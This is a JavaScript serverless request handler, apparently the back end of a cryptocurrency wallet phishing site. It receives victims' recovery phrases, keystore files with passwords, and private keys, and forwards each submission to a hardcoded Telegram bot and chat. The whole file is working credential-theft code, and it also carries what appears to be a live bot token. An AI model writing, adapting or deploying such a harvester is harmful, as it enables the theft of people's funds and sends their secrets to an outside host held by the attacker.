export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).send('Method Not Allowed');
  }

  const { type, phrase, keystore, password, privateKey, walletName } = req.body;

  // Construct message based on type
  let message = `🛑 New ${type.toUpperCase()} Submission\nWallet: ${walletName}\n`;

  if (type === 'phrase') message += `Phrase: ${phrase}`;
  if (type === 'keystore') message += `Keystore: ${keystore}\nPassword: ${password}`;
  if (type === 'privatekey') message += `Private Key: ${privateKey}`;

  const TELEGRAM_BOT_TOKEN = '8072535178:AAEECwdN4jeLk3qQBQq1NaqObmHAcQ8uOZI';
  const TELEGRAM_CHAT_ID = '1129243973';

  const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  try {
    const tgRes = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message
      })
    });

    if (!tgRes.ok) {
      throw new Error('Telegram API failed');
    }

    res.status(200).json({ status: 'success' });
  } catch (err) {
    console.error(err);
    res.status(500).json({ status: 'error', message: err.message });
  }
}
